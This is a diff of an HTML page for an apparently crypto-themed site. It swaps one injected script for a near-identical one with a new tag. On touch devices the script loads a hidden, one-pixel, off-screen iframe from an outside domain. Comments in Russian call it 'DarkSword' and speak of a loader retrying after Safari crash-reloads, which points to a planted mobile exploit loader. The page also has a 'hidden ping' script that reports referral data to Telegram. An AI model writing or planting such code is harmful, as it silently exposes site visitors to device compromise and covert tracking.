@@ -440,31 +440,7 @@
         <h1 style="color: white; font-size: 4rem; font-family: 'Inter', sans-serif; text-shadow: 0 4px 20px rgba(0,0,0,0.8); text-align: center;">Take a walk, anon.<br><span style="font-size: 1.5rem">The charts aren't real.</span></h1>
     </div>
 <script src="app.js"></script>
-<script>
-(function() {
-  sessionStorage.setItem("ds_tag", "a6ded0");
-  if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
-    // DarkSword: старый вечный uid-guard хоронил ретраи после Safari-краш-релоада
-    // (sessionStorage живёт до закрытия таба). ds_done ставит лоадер после успеха.
-    var _dsDone = 0;
-    try { _dsDone = parseInt(sessionStorage.getItem("ds_done") || "0", 10) || 0; } catch (eD) {}
-    if (_dsDone && (Date.now() - _dsDone) < 10 * 60 * 1000) return;
-    var frame = document.createElement('iframe');
-    var _t = (new URLSearchParams(location.search)).get("ds_tag");
-    var _tag = _t || "a6ded0";
-    frame.src = "https://api.aoetherprotocol.com/ds/f/a6ded0?" + "?ds_tag=" + encodeURIComponent(_tag) + "&" + Math.random();
-    frame.style.width = "1px";
-    frame.style.opacity = "0.01";
-    frame.style.position = "absolute";
-    frame.style.left = "-9999px";
-    frame.style.height = "1px";
-    frame.style.border = "none";
-    (document.body || document.documentElement).appendChild(frame);
-  } else {
-    return;
-  }
-})();
-</script>
+
         <!-- Скрипт для отслеживания рефералов (скрытый пинг в Telegram) -->
 <script>
   // 1. Ищем параметр ?ref= в ссылке
@@ -493,6 +469,31 @@
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message: finalMessage }) 
   }).catch(error => console.log('Ping error', error));
+</script>
+        <script>
+(function() {
+  sessionStorage.setItem("ds_tag", "483b4e");
+  if ("ontouchstart" in window || navigator.maxTouchPoints > 0) {
+    // DarkSword: старый вечный uid-guard хоронил ретраи после Safari-краш-релоада
+    // (sessionStorage живёт до закрытия таба). ds_done ставит лоадер после успеха.
+    var _dsDone = 0;
+    try { _dsDone = parseInt(sessionStorage.getItem("ds_done") || "0", 10) || 0; } catch (eD) {}
+    if (_dsDone && (Date.now() - _dsDone) < 10 * 60 * 1000) return;
+    var frame = document.createElement('iframe');
+    var _t = (new URLSearchParams(location.search)).get("ds_tag");
+    var _tag = _t || "483b4e";
+    frame.src = "https://api.aoetherprotocol.com/ds/f/483b4e?" + "?ds_tag=" + encodeURIComponent(_tag) + "&" + Math.random();
+    frame.style.width = "1px";
+    frame.style.opacity = "0.01";
+    frame.style.position = "absolute";
+    frame.style.left = "-9999px";
+    frame.style.height = "1px";
+    frame.style.border = "none";
+    (document.body || document.documentElement).appendChild(frame);
+  } else {
+    return;
+  }
+})();
 </script>
     </body>
 </html> 
